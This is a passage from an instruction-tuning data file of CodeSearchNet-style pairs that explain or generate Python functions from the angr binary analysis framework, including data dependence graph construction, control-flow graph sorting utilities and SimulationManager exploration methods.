b, data in out_edges if 'type' not in data or data['type'] != 'kill']\n\n            if excluding_types:\n                out_edges = [ (a, b, data) for a, b, data in out_edges if\n                              'type' not in data or data['type'] not in excluding_types\n                              ]\n\n            for src, dst, data in out_edges:\n                result.add_edge(src, dst, **data)\n\n                if dst not in traversed:\n                    queue.append(dst)\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _construct(self):\n\n        worklist = []\n        worklist_set = set()\n\n        # Initialize the worklist\n        if self._start is None:\n            # initial nodes are those nodes in CFG that has no in-degrees\n            for n in self._cfg.graph.nodes():\n                if self._cfg.graph.in_degree(n) == 0:\n                    # Put it into the worklist\n                    job = DDGJob(n, 0)\n                    self._worklist_append(job, worklist, worklist_set)\n        else:\n            for n in self._cfg.get_all_nodes(self._start):\n                job = DDGJob(n, 0)\n                self._worklist_append(job, worklist, worklist_set)\n\n        # A dict storing defs set\n        # DDGJob -> LiveDefinition\n        live_defs_per_node = {}\n\n        while worklist:\n            # Pop out a node\n            ddg_job = worklist[0]\n            l.debug(\"Processing %s.\", ddg_job)\n            node, call_depth = ddg_job.cfg_node, ddg_job.call_depth\n            worklist = worklist[ 1 : ]\n            worklist_set.remove(node)\n\n            # Grab all final states. There are usually more than one (one state for each successor), and we gotta\n            # process all of them\n            final_states = node.final_states\n\n            if node in live_defs_per_node:\n                live_defs = live_defs_per_node[node]\n            else:\n                live_defs = LiveDefinitions()\n                live_defs_per_node[node] = live_defs\n\n            successing_nodes = list(self._cfg.graph.successors(node))\n\n            # try to assign every final state to a successor and vice versa\n            match_suc = defaultdict(bool)\n            match_state = defaultdict(set)\n\n            for suc in successing_nodes:\n                matched = False\n                for state in final_states:\n                    try:\n                        if state.solver.eval(state.ip) == suc.addr:\n                            match_suc[suc.addr] = True\n                            match_state[state].add(suc)\n                            matched = True\n                    except (SimUnsatError, SimSolverModeError, ZeroDivisionError):\n                        # ignore\n                        matched = matched\n                if not matched:\n                    break\n\n            # whether all final states could be matched to a successor and vice versa\n            matches = len(match_suc) == len(successing_nodes) and len(match_state) == len(final_states)\n\n            for state in final_states:\n                if not matches and state.history.jumpkind == 'Ijk_FakeRet' and len(final_states) > 1:\n                    # Skip fakerets if there are other control flow transitions available\n                    continue\n\n                new_call_depth = call_depth\n                if state.history.jumpkind == 'Ijk_Call':\n                    new_call_depth += 1\n                elif state.history.jumpkind == 'Ijk_Ret':\n                    new_call_depth -= 1\n\n                if self._call_depth is not None and call_depth > self._call_depth:\n                    l.debug('Do not trace into %s due to the call depth limit', state.ip)\n                    continue\n\n                new_defs = self._track(state, live_defs, node.irsb.statements if node.irsb is not None else None)\n\n                #corresponding_successors = [n for n in successing_nodes if\n                #                            not state.ip.symbolic and n.addr == state.solver.eval(state.ip)]\n                #if not corresponding_successors:\n                #    continue\n\n                changed = False\n\n                # if every successor can be matched with one or more final states (by IP address),\n                # only take over the LiveDefinition of matching states\n                if matches:\n                    add_state_to_sucs = match_state[state]\n                else:\n                    add_state_to_sucs = successing_nodes\n\n                for successing_node in add_state_to_sucs:\n\n                    if (state.history.jumpkind == 'Ijk_Call' or state.history.jumpkind.startswith('Ijk_Sys')) and \\\n                            (state.ip.symbolic or successing_node.addr != state.solver.eval(state.ip)):\n                        suc_new_defs = self._filter_defs_at_call_sites(new_defs)\n                    else:\n                        suc_new_defs = new_defs\n\n                    if successing_node in live_defs_per_node:\n                        defs_for_next_node = live_defs_per_node[successing_node]\n                    else:\n                        defs_for_next_node = LiveDefinitions()\n                        live_defs_per_node[successing_node] = defs_for_next_node\n\n                    for var, code_loc_set in suc_new_defs.items():\n                        # l.debug(\"Adding %d new definitions for variable %s.\", len(code_loc_set), var)\n                        changed |= defs_for_next_node.add_defs(var, code_loc_set)\n\n                if changed:\n                    if (self._call_depth is None) or \\\n                            (self._call_depth is not None and 0 <= new_call_depth <= self._call_depth):\n                        # Put all reachable successors back to our work-list again\n                        for successor in self._cfg.get_all_successors(node):\n                            nw = DDGJob(successor, new_call_depth)\n                            self._worklist_append(nw, worklist, worklist_set)", "response": "Constructs the data dependence graph."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngive all live definitions prior to this program point, track the changes, and return a new list of live definitions. We scan through the action list of the new state to track the changes. :param state: The input state at that program point. :param live_defs: All live definitions prior to reaching this program point. :param list statements: A list of VEX statements. :returns: A list of new live definitions. :rtype: angr.analyses.ddg.LiveDefinitions", "response": "def _track(self, state, live_defs, statements):\n        \"\"\"\n        Given all live definitions prior to this program point, track the changes, and return a new list of live\n        definitions. We scan through the action list of the new state to track the changes.\n\n        :param state:           The input state at that program point.\n        :param live_defs:       All live definitions prior to reaching this program point.\n        :param list statements: A list of VEX statements.\n        :returns:               A list of new live definitions.\n        :rtype:                 angr.analyses.ddg.LiveDefinitions\n        \"\"\"\n\n        # Make a copy of live_defs\n        self._live_defs = live_defs.copy()\n\n        action_list = list(state.history.recent_actions)\n\n        # Since all temporary variables are local, we simply track them in a dict\n        self._temp_variables = { }\n        self._temp_register_symbols = { }\n\n        # All dependence edges are added to the graph either at the end of this method, or when they are going to be\n        # overwritten by a new edge. This is because we sometimes have to modify a previous edge (e.g. add new labels\n        # to the edge)\n        self._temp_edges = defaultdict(list)\n        self._register_edges = defaultdict(list)\n\n        last_statement_id = None\n        self._variables_per_statement = None  # program variables read out in the same statement. we keep a copy of those variables here so\n                                              # we can link it to the tmp_write action right afterwards\n        self._custom_data_per_statement = None\n\n        for a in action_list:\n            if last_statement_id is None or last_statement_id != a.stmt_idx:\n                # update statement ID\n                last_statement_id = a.stmt_idx\n                statement = statements[last_statement_id] if statements and last_statement_id < len(statements) else None\n\n                # initialize all per-statement data structures\n                self._variables_per_statement = [ ]\n                self._custom_data_per_statement = None\n\n            if a.sim_procedure is None:\n                current_code_location = CodeLocation(a.bbl_addr, a.stmt_idx, ins_addr=a.ins_addr)\n            else:\n                current_code_location = CodeLocation(None, None, sim_procedure=a.sim_procedure)\n\n            if a.type == 'exit':\n                self._handle_exit(a, current_code_location, state, statement)\n            elif a.type == 'operation':\n                self._handle_operation(a, current_code_location, state, statement)\n            elif a.type == 'constraint':\n                pass\n            else:\n                handler_name = \"_handle_%s_%s\" % (a.type, a.action)\n                if hasattr(self, handler_name):\n                    getattr(self, handler_name)(a, current_code_location, state, statement)\n                else:\n                    l.debug(\"Skip an unsupported action %s.\", a)\n\n        return self._live_defs"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _def_lookup(self, variable):  # pylint:disable=no-self-use\n\n        prevdefs = {}\n\n        for code_loc in self._live_defs.lookup_defs(variable):\n            # Label edges with cardinality or actual sets of addresses\n            if isinstance(variable, SimMemoryVariable):\n                type_ = 'mem'\n            elif isinstance(variable, SimRegisterVariable):\n                type_ = 'reg'\n            else:\n                raise AngrDDGError('Unknown variable type %s' % type(variable))\n\n            prevdefs[code_loc] = {\n                'type': type_,\n                'data': variable\n            }\n\n        return prevdefs", "response": "This method is a backward lookup in the previous defs."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nkilling previous defs. addr_list is a list of normalized addresses.", "response": "def _kill(self, variable, code_loc):  # pylint:disable=no-self-use\n        \"\"\"\n        Kill previous defs. addr_list is a list of normalized addresses.\n        \"\"\"\n\n        # Case 1: address perfectly match, we kill\n        # Case 2: a is a subset of the original address\n        # Case 3: a is a superset of the original address\n\n        # the previous definition is killed. mark it in data graph.\n\n        if variable in self._live_defs:\n            for loc in self._live_defs.lookup_defs(variable):\n                pv = ProgramVariable(variable, loc, arch=self.project.arch)\n                self._data_graph_add_edge(pv, ProgramVariable(variable, code_loc, arch=self.project.arch), type='kill')\n\n        self._live_defs.kill_def(variable, code_loc)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_register_size(self, reg_offset):\n\n        # TODO: support registers that are not aligned\n        if reg_offset in self.project.arch.register_names:\n            reg_name = self.project.arch.register_names[reg_offset]\n            reg_size = self.project.arch.registers[reg_name][1]\n            return reg_size\n\n        l.warning(\"_get_register_size(): unsupported register offset %d. Assum size 1. \"\n                  \"More register name mappings should be implemented in archinfo.\", reg_offset)\n        return 1", "response": "Get the size of a register."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_actual_addrs(action, state):\n\n        if action.actual_addrs is None:\n            # For now, mem reads don't necessarily have actual_addrs set properly\n            try:\n                addr_list = {state.solver.eval(action.addr.ast)}\n            except (SimSolverModeError, SimUnsatError, ZeroDivisionError):\n                # FIXME: ZeroDivisionError should have been caught by claripy and simuvex.\n                # FIXME: see claripy issue #75. this is just a temporary workaround.\n                # it's symbolic... just continue\n                addr_list = {0x60000000}  # TODO: this is a random address that I pick. Fix it.\n        else:\n            addr_list = set(action.actual_addrs)\n\n        return addr_list", "response": "Get a list of addresses that are accessed with that action."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _create_memory_variable(self, action, addr, addrs):\n\n        variable = None\n        if len(addrs) == 1 and len(action.addr.tmp_deps) == 1:\n            addr_tmp = list(action.addr.tmp_deps)[0]\n            if addr_tmp in self._temp_register_symbols:\n                # it must be a stack variable\n                sort, offset = self._temp_register_symbols[addr_tmp]\n                variable = SimStackVariable(offset, action.size.ast // 8, base=sort, base_addr=addr - offset)\n\n        if variable is None:\n            variable = SimMemoryVariable(addr, action.size.ast // 8)\n\n        return variable", "response": "Create a SimStackVariable or SimMemoryVariable based on action objects and address."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd an edge to the data dependence graph.", "response": "def _data_graph_add_edge(self, src, dst, **edge_labels):\n        \"\"\"\n        Add an edge in the data dependence graph.\n\n        :param ProgramVariable src: Source node.\n        :param ProgramVariable dst: Destination node.\n        :param edge_labels: All labels associated with the edge.\n        :return: None\n        \"\"\"\n\n        if src in self._data_graph and dst in self._data_graph[src]:\n            return\n\n        self._data_graph.add_edge(src, dst, **edge_labels)\n\n        self._simplified_data_graph = None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd an edge from a program location src to another program location dst.", "response": "def _stmt_graph_add_edge(self, src, dst, **edge_labels):\n        \"\"\"\n        Add an edge in the statement dependence graph from a program location `src` to another program location `dst`.\n\n        :param CodeLocation src: Source node.\n        :param CodeLocation dst: Destination node.\n        :param edge_labels: All labels associated with the edge.\n        :returns: None\n        \"\"\"\n\n        # Is that edge already in the graph ?\n        # If at least one is new, then we are not redoing the same path again\n        if src in self._stmt_graph and dst in self._stmt_graph[src]:\n            return\n\n        self._stmt_graph.add_edge(src, dst, **edge_labels)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _stmt_graph_annotate_edges(self, edges_to_annotate, **new_labels):\n\n        graph = self.graph\n\n        for src, dst in edges_to_annotate:\n\n            if src not in graph:\n                continue\n            if dst not in graph[src]:\n                continue\n\n            data = graph[src][dst]\n\n            for k, v in new_labels.items():\n                if k in data:\n                    if v not in data[k]:\n                        data[k] = data[k] + (v,)\n                else:\n                    # Construct a tuple\n                    data[k] = (v,)", "response": "Add new annotations to edges in the statement dependence graph."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _simplify_data_graph(self, data_graph):  # pylint:disable=no-self-use\n\n        graph = networkx.MultiDiGraph(data_graph)\n\n        all_nodes = [ n for n in graph.nodes() if isinstance(n.variable, SimTemporaryVariable) ]\n\n        for tmp_node in all_nodes:\n            # remove each tmp node by linking their successors and predecessors directly\n            in_edges = graph.in_edges(tmp_node, data=True)\n            out_edges = graph.out_edges(tmp_node, data=True)\n\n            for pred, _, _ in in_edges:\n                graph.remove_edge(pred, tmp_node)\n            for _, suc, _ in out_edges:\n                graph.remove_edge(tmp_node, suc)\n\n            for pred, _, data_in in in_edges:\n                for _, suc, data_out in out_edges:\n                    if pred is not tmp_node and suc is not tmp_node:\n                        if suc not in graph[pred]:\n                            data = data_in.copy()\n                            data.update(data_out)\n                            graph.add_edge(pred, suc, **data)\n\n            graph.remove_node(tmp_node)\n\n        return graph", "response": "Simplify a data dependence graph by removing all temp variable nodes and linking them directly to the data nodes."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _worklist_append(self, node_wrapper, worklist, worklist_set):\n\n        if node_wrapper.cfg_node in worklist_set:\n            # It's already in the work-list\n            return\n\n        worklist.append(node_wrapper)\n        worklist_set.add(node_wrapper.cfg_node)\n\n        stack = [ node_wrapper ]\n        traversed_nodes = { node_wrapper.cfg_node }\n        inserted = { node_wrapper.cfg_node }\n\n        while stack:\n            nw = stack.pop()\n            n, call_depth = nw.cfg_node, nw.call_depth\n\n            # Get successors\n            edges = self._cfg.graph.out_edges(n, data=True)\n\n            for _, dst, data in edges:\n                if (dst not in traversed_nodes # which means we haven't touch this node in this appending procedure\n                        and dst not in worklist_set): # which means this node is not in the work-list\n                    # We see a new node!\n                    traversed_nodes.add(dst)\n\n                    if data['jumpkind'] == 'Ijk_Call':\n                        if self._call_depth is None or call_depth < self._call_depth:\n                            inserted.add(dst)\n                            new_nw = DDGJob(dst, call_depth + 1)\n                            worklist.append(new_nw)\n                            worklist_set.add(dst)\n                            stack.append(new_nw)\n                    elif data['jumpkind'] == 'Ijk_Ret':\n                        if call_depth > 0:\n                            inserted.add(dst)\n                            new_nw = DDGJob(dst, call_depth - 1)\n                            worklist.append(new_nw)\n                            worklist_set.add(dst)\n                            stack.append(new_nw)\n                    else:\n                        new_nw = DDGJob(dst, call_depth)\n                        inserted.add(dst)\n                        worklist_set.add(dst)\n                        worklist.append(new_nw)\n                        stack.append(new_nw)\n\n        return inserted", "response": "Append a CFGNode and its successors into the work - list and respect the call - depth limit."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build_function_dependency_graphs(self):\n\n        # This is a map between functions and its corresponding dependencies\n        self._function_data_dependencies = defaultdict(networkx.DiGraph)\n\n        # Group all dependencies first\n\n        block_addr_to_func = { }\n        for _, func in self.kb.functions.items():\n            for block in func.blocks:\n                block_addr_to_func[block.addr] = func\n\n        for src, dst, data in self.graph.edges(data=True):\n            src_target_func = None\n            if src.block_addr in block_addr_to_func:\n                src_target_func = block_addr_to_func[src.block_addr]\n                self._function_data_dependencies[src_target_func].add_edge(src, dst, **data)\n\n            if dst.block_addr in block_addr_to_func:\n                dst_target_func = block_addr_to_func[dst.block_addr]\n                if not dst_target_func is src_target_func:\n                    self._function_data_dependencies[dst_target_func].add_edge(src, dst, **data)", "response": "Builds the function dependency graphs for each function and saves them in self. _function_data_dependencies."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _filter_defs_at_call_sites(self, defs):\n\n        # TODO: make definition killing architecture independent and calling convention independent\n        # TODO: use information from a calling convention analysis\n        filtered_defs = LiveDefinitions()\n        for variable, locs in defs.items():\n            if isinstance(variable, SimRegisterVariable):\n                if self.project.arch.name == 'X86':\n                    if variable.reg in (self.project.arch.registers['eax'][0],\n                                        self.project.arch.registers['ecx'][0],\n                                        self.project.arch.registers['edx'][0]):\n                        continue\n\n            filtered_defs.add_defs(variable, locs)\n\n        return filtered_defs", "response": "Filter out the defs that are not called at real execution."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind all definitions of the given variable.", "response": "def find_definitions(self, variable, location=None, simplified_graph=True):\n        \"\"\"\n        Find all definitions of the given variable.\n\n        :param SimVariable variable:\n        :param bool simplified_graph: True if you just want to search in the simplified graph instead of the normal\n                                      graph. Usually the simplified graph suffices for finding definitions of register\n                                      or memory variables.\n        :return: A collection of all variable definitions to the specific variable.\n        :rtype: list\n        \"\"\"\n\n        if simplified_graph:\n            graph = self.simplified_data_graph\n        else:\n            graph = self.data_graph\n\n        defs = []\n\n        for n in graph.nodes():  # type: ProgramVariable\n            if n.variable == variable:\n                if location is None:\n                    defs.append(n)\n                else:\n                    # TODO: finish this part\n                    if n.location.block_addr == location.block_addr:\n                        defs.append(n)\n\n        return defs"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfinding all consumers to the specified variable definition.", "response": "def find_consumers(self, var_def, simplified_graph=True):\n        \"\"\"\n        Find all consumers to the specified variable definition.\n\n        :param ProgramVariable var_def: The variable definition.\n        :param bool simplified_graph: True if we want to search in the simplified graph, False otherwise.\n        :return: A collection of all consumers to the specified variable definition.\n        :rtype: list\n        \"\"\"\n\n        if simplified_graph:\n            graph = self.simplified_data_graph\n        else:\n            graph = self.data_graph\n\n        if var_def not in graph:\n            return []\n\n        consumers = []\n        srcs = [var_def]\n        traversed = set()\n\n        while srcs:\n            src = srcs.pop()\n            out_edges = graph.out_edges(src, data=True)\n            for _, dst, data in out_edges:\n                if 'type' in data and data['type'] == 'kill':\n                    # skip killing edges\n                    continue\n                if isinstance(dst.variable, SimTemporaryVariable):\n                    if dst not in traversed:\n                        srcs.append(dst)\n                        traversed.add(dst)\n                else:\n                    if dst not in consumers:\n                        consumers.append(dst)\n\n        return consumers"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef find_killers(self, var_def, simplified_graph=True):\n\n        if simplified_graph:\n            graph = self.simplified_data_graph\n        else:\n            graph = self.data_graph\n\n        if var_def not in graph:\n            return []\n\n        killers = []\n        out_edges = graph.out_edges(var_def, data=True)\n        for _, dst, data in out_edges:\n            if 'type' in data and data['type'] == 'kill':\n                killers.append(dst)\n\n        return killers", "response": "Find all killers to the specified variable definition."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_sources(self, var_def, simplified_graph=True):\n\n        if simplified_graph:\n            graph = self.simplified_data_graph\n        else:\n            graph = self.data_graph\n\n        if var_def not in graph:\n            return []\n\n        sources = []\n        defs = [ var_def ]\n        traversed = set()\n\n        while defs:\n            definition = defs.pop()\n            in_edges = graph.in_edges(definition, data=True)\n            for src, _, data in in_edges:\n                if 'type' in data and data['type'] == 'kill':\n                    continue\n                if isinstance(src.variable, SimTemporaryVariable):\n                    if src not in traversed:\n                        defs.append(src)\n                        traversed.add(src)\n                else:\n                    if src not in sources:\n                        sources.append(src)\n\n        return sources", "response": "Find all sources to the specified variable definition."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef new_array(state, element_type, size, default_value_generator=None):\n        size_bounded = SimSootExpr_NewMultiArray._bound_multi_array_size(state, size)\n        # return the reference of the array base\n        # => elements getting lazy initialized in the javavm memory\n        return SimSootValue_ArrayBaseRef(heap_alloc_id=state.javavm_memory.get_new_uuid(),\n                                         element_type=element_type,\n                                         size=size_bounded,\n                                         default_value_generator=default_value_generator)", "response": "Allocates a new multi array in memory and returns the reference to the base."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the minimum solution of an address.", "response": "def _min(self, memory, addr, **kwargs):\n        \"\"\"\n        Gets the minimum solution of an address.\n        \"\"\"\n        return memory.state.solver.min(addr, exact=kwargs.pop('exact', self._exact), **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the maximum solution of an address.", "response": "def _max(self, memory, addr, **kwargs):\n        \"\"\"\n        Gets the maximum solution of an address.\n        \"\"\"\n        return memory.state.solver.max(addr, exact=kwargs.pop('exact', self._exact), **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _any(self, memory, addr, **kwargs):\n        return memory.state.solver.eval(addr, exact=kwargs.pop('exact', self._exact), **kwargs)", "response": "Gets any solution of an address."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nevaluating the current state of the current solver.", "response": "def _eval(self, memory, addr, n, **kwargs):\n        \"\"\"\n        Gets n solutions for an address.\n        \"\"\"\n        return memory.state.solver.eval_upto(addr, n, exact=kwargs.pop('exact', self._exact), **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the min max range of solutions for an address.", "response": "def _range(self, memory, addr, **kwargs):\n        \"\"\"\n        Gets the (min, max) range of solutions for an address.\n        \"\"\"\n        return (self._min(memory, addr, **kwargs), self._max(memory, addr, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef concretize(self, memory, addr):\n        if self._filter is None or self._filter(memory, addr):\n            return self._concretize(memory, addr)", "response": "Concretizes the address into a list of values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngive a local transition graph of a function find all merge points inside and then perform quasi - topological sort of those merge points.", "response": "def find_merge_points(function_addr, function_endpoints, graph):  # pylint:disable=unused-argument\n        \"\"\"\n        Given a local transition graph of a function, find all merge points inside, and then perform a\n        quasi-topological sort of those merge points.\n\n        A merge point might be one of the following cases:\n        - two or more paths come together, and ends at the same address.\n        - end of the current function\n\n        :param int function_addr: Address of the function.\n        :param list function_endpoints: Endpoints of the function. They typically come from Function.endpoints.\n        :param networkx.DiGraph graph: A local transition graph of a function. Normally it comes from Function.graph.\n        :return: A list of ordered addresses of merge points.\n        :rtype: list\n        \"\"\"\n\n        merge_points = set()\n\n        for node in graph.nodes():\n            if graph.in_degree(node) > 1:\n                merge_points.add(node)\n\n        ordered_merge_points = CFGUtils.quasi_topological_sort_nodes(graph, merge_points)\n\n        addrs = [n.addr for n in ordered_merge_points]\n        return addrs"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngive a local transition graph of a function find all widening points inside.", "response": "def find_widening_points(function_addr, function_endpoints, graph):  # pylint: disable=unused-argument\n        \"\"\"\n        Given a local transition graph of a function, find all widening points inside.\n\n        Correctly choosing widening points is very important in order to not lose too much information during static\n        analysis. We mainly consider merge points that has at least one loop back edges coming in as widening points.\n\n        :param int function_addr: Address of the function.\n        :param list function_endpoints: Endpoints of the function, typically coming from Function.endpoints.\n        :param networkx.DiGraph graph: A local transition graph of a function, normally Function.graph.\n        :return: A list of addresses of widening points.\n        :rtype: list\n        \"\"\"\n\n        sccs = networkx.strongly_connected_components(graph)\n\n        widening_addrs = set()\n\n        for scc in sccs:\n            if len(scc) == 1:\n                node = next(iter(scc))\n                if graph.has_edge(node, node):\n                    # self loop\n                    widening_addrs.add(node.addr)\n            else:\n                for n in scc:\n                    predecessors = graph.predecessors(n)\n                    if any([ p not in scc for p in predecessors]):\n                        widening_addrs.add(n.addr)\n                        break\n\n        return list(widening_addrs)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef reverse_post_order_sort_nodes(graph, nodes=None):\n\n        post_order = networkx.dfs_postorder_nodes(graph)\n\n        if nodes is None:\n            return reversed(list(post_order))\n\n        addrs_to_index = {}\n        for i, n in enumerate(post_order):\n            addrs_to_index[n.addr] = i\n        return sorted(nodes, key=lambda n: addrs_to_index[n.addr], reverse=True)", "response": "Sort a given set of nodes in reverse post ordering."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef quasi_topological_sort_nodes(graph, nodes=None):\n\n        # fast path for single node graphs\n        if graph.number_of_nodes() == 1:\n            return graph.nodes()\n\n        # make a copy to the graph since we are gonna modify it\n        graph_copy = networkx.DiGraph()\n\n        # find all strongly connected components in the graph\n        sccs = [ scc for scc in networkx.strongly_connected_components(graph) if len(scc) > 1 ]\n\n        # collapse all strongly connected components\n        for src, dst in graph.edges():\n            scc_index = CFGUtils._components_index_node(sccs, src)\n            if scc_index is not None:\n                src = SCCPlaceholder(scc_index)\n            scc_index = CFGUtils._components_index_node(sccs, dst)\n            if scc_index is not None:\n                dst = SCCPlaceholder(scc_index)\n\n            if isinstance(src, SCCPlaceholder) and isinstance(dst, SCCPlaceholder) and src == dst:\n                continue\n            if src == dst:\n                continue\n\n            graph_copy.add_edge(src, dst)\n\n        # add loners\n        out_degree_zero_nodes = [node for (node, degree) in graph.out_degree() if degree == 0]\n        for node in out_degree_zero_nodes:\n            if graph.in_degree(node) == 0:\n                graph_copy.add_node(node)\n\n        # topological sort on acyclic graph `graph_copy`\n        tmp_nodes = networkx.topological_sort(graph_copy)\n\n        ordered_nodes = [ ]\n        for n in tmp_nodes:\n            if isinstance(n, SCCPlaceholder):\n                CFGUtils._append_scc(graph, ordered_nodes, sccs[n.scc_id])\n            else:\n                ordered_nodes.append(n)\n\n        if nodes is None:\n            return ordered_nodes\n\n        nodes = set(nodes)\n        ordered_nodes = [ n for n in ordered_nodes if n in nodes ]\n        return ordered_nodes", "response": "This function sorts a given set of nodes in a given graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nappends all nodes from a strongly connected component to a list of ordered nodes and ensure the topological sort order.", "response": "def _append_scc(graph, ordered_nodes, scc):\n        \"\"\"\n        Append all nodes from a strongly connected component to a list of ordered nodes and ensure the topological\n        order.\n\n        :param networkx.DiGraph graph: The graph where all nodes belong to.\n        :param list ordered_nodes:     Ordered nodes.\n        :param iterable scc:           A set of nodes that forms a strongly connected component in the graph.\n        :return:                       None\n        \"\"\"\n\n        # find the first node in the strongly connected component that is the successor to any node in ordered_nodes\n        loop_head = None\n        for parent_node in reversed(ordered_nodes):\n            for n in scc:\n                if n in graph[parent_node]:\n                    loop_head = n\n                    break\n\n            if loop_head is not None:\n                break\n\n        if loop_head is None:\n            # randomly pick one\n            loop_head = next(iter(scc))\n\n        subgraph = graph.subgraph(scc).copy()  # type: networkx.DiGraph\n        for src, _ in list(subgraph.in_edges(loop_head)):\n            subgraph.remove_edge(src, loop_head)\n\n        ordered_nodes.extend(CFGUtils.quasi_topological_sort_nodes(subgraph))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nmake a copy of this simulation manager.", "response": "def copy(self, deep=False): # pylint: disable=arguments-differ\n        \"\"\"\n        Make a copy of this simulation manager. Pass ``deep=True`` to copy all the states in it as well.\n        \"\"\"\n        simgr = SimulationManager(self._project,\n                                  stashes=self._copy_stashes(deep=deep),\n                                  hierarchy=self._hierarchy,\n                                  resilience=self._resilience,\n                                  auto_drop=self._auto_drop,\n                                  completion_mode=self.completion_mode,\n                                  errored=self._errored)\n        return simgr"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses an exploration technique with this SimulationManager.", "response": "def use_technique(self, tech):\n        \"\"\"\n        Use an exploration technique with this SimulationManager.\n\n        Techniques can be found in :mod:`angr.exploration_techniques`.\n\n        :param tech:    An ExplorationTechnique object that contains code to modify\n                        this SimulationManager's behavior.\n        :type tech:     ExplorationTechnique\n        :return:        The technique that was added, for convenience\n        \"\"\"\n        if not isinstance(tech, ExplorationTechnique):\n            raise SimulationManagerError\n\n        # XXX: as promised\n        tech.project = self._project\n        tech.setup(self)\n\n        HookSet.install_hooks(self, **tech._get_hooks())\n        self._techniques.append(tech)\n        return tech"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef remove_technique(self, tech):\n        if not isinstance(tech, ExplorationTechnique):\n            raise SimulationManagerError\n\n        def _is_overriden(name):\n            return getattr(tech, name).__code__ is not getattr(ExplorationTechnique, name).__code__\n\n        overriden = filter(_is_overriden, ('step', 'filter', 'selector', 'step_state', 'successors'))\n        hooks = {name: getattr(tech, name) for name in overriden}\n        HookSet.remove_hooks(self, **hooks)\n\n        self._techniques.remove(tech)\n        return tech", "response": "Removes an exploration technique from a list of active techniques."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef explore(self, stash='active', n=None, find=None, avoid=None, find_stash='found', avoid_stash='avoid', cfg=None,\n                num_find=1, **kwargs):\n        \"\"\"\n        Tick stash \"stash\" forward (up to \"n\" times or until \"num_find\" states are found), looking for condition \"find\",\n        avoiding condition \"avoid\". Stores found states into \"find_stash' and avoided states into \"avoid_stash\".\n\n        The \"find\" and \"avoid\" parameters may be any of:\n\n        - An address to find\n        - A set or list of addresses to find\n        - A function that takes a state and returns whether or not it matches.\n\n        If an angr CFG is passed in as the \"cfg\" parameter and \"find\" is either a number or a list or a set, then\n        any states which cannot possibly reach a success state without going through a failure state will be\n        preemptively avoided.\n        \"\"\"\n        num_find += len(self._stashes[find_stash]) if find_stash in self._stashes else 0\n        tech = self.use_technique(Explorer(find, avoid, find_stash, avoid_stash, cfg, num_find))\n\n        try:\n            self.run(stash=stash, n=n, **kwargs)\n        finally:\n            self.remove_technique(tech)\n\n        return self", "response": "Explore the current state."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef run(self, stash='active', n=None, until=None, **kwargs):\n        for _ in (itertools.count() if n is None else range(0, n)):\n            if not self.complete() and self._stashes[stash]:\n                self.step(stash=stash, **kwargs)\n                if not (until and until(self)):\n                    continue\n            break\n        return self", "response": "Runs the simulation manager until the current state is reached."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef complete(self):\n        if not self._techniques:\n            return False\n        if not any(tech._is_overriden('complete') for tech in self._techniques):\n            return False\n        return self.completion_mode(tech.complete(self) for tech in self._techniques if tech._is_overriden('complete'))", "response": "Returns whether or not this manager has reached a completed state."}
